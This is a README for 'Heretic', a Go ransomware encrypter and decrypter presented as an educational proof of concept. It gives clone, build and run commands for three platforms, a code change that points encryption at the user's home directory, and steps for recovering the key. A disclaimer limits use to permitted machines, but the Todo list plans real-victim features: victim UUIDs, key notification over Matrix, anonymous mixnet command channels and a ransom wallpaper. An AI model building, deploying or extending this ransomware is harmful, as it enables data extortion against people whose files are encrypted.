# HERETIC RANSOMWARE

Heretic is a blazingly fast, discriminate, concurrent Ransomware and decrypter PoC, written in Go, using XChaCha20poly1305.

It uses an sqlite database to save the path and filename of the files it encrypts

---

## Disclaimer

Heretic is a proof of concept, built for educational purposes and should not be used on any systems where you do not have permission.

---

## Ethical considerations

Heretic is made simply for the love of coding, the need to learn and an interest in cybersecurity and the research of malicious software for myself and others. Only use Heretic on machines you have permission to.

---

## How to use

#### Encryption

1. Clone the Heretic repository
   
   ```bash
   git clone https://github.com/dark-faction/Heretic-Ransomware.git
   ```

2. Revise the root directory from where Heretic starts walkind the directories looking for file. Uncomment the code and comment out the 'dirname' variable to work from the users Home directory.
   
   ```go
   func FileWalkerEncrypt() {
       //dirname, err := os.UserHomeDir()
       //if err != nil {
       //    zap.L().Info(err.Error())
       //}
   
       dirname := "/home/anon/RansomFiles"
       ...
   }
   ```

3. Head to the 'cmd > heretic' folder and build the heretic.go file, this will create a single binary, this will create a seperate binary for linux, windows and darwin:
   
   ```bash
   make build
   ```

4. Run the binary:
   
   ```bash
   ./heretic
   ```

#### Decryption

1. Head to the cmd > heretic folder and build the heretic.go file:
   
   ```bash
   make build
   ```

2. Ensuring the decrypted binary is in the same folder as the created sqlite database, run the file with the decryption key:
   
   ```go
   ./heretic-decrypt-<platform> <key>
   ```

#### Caveats

If you simply run the encrypter using the binary, you will not be notified of the decryption key. to get the decryption key, run heretic using the following command from with the 'cmd>heretic folder':

```bash
make run
```

---

# Todo

This section will be continually revised:

- [ ] Create unique UUID for target system

- [ ] Notification of unique victim UUID and decryption key to some platform such as Matrix

- [ ] Add remote decrypt and comms using some anon preserving Mixnet

- [ ] Change desktop wallpaper to Heretic warning image upon encrypt and improve target notification of files being encrypted

- [ ] Revise excluded files on linux, darwin and windows

- [ ] Ensure cross platform compatibility with more testing

---

## Versioning

Heretic uses semantic versioning:

1. MAJOR version when you make incompatible API changes

2. MINOR version when you add functionality in a backward compatible
   manner

3. PATCH version when you make backward compatible bug fixes

Additional labels for pre-release and build metadata are available as extensions
to the MAJOR.MINOR.PATCH format.

---

## License

This is free and unencumbered software released into the public domain using [the unlicense](https://unlicense.org/)
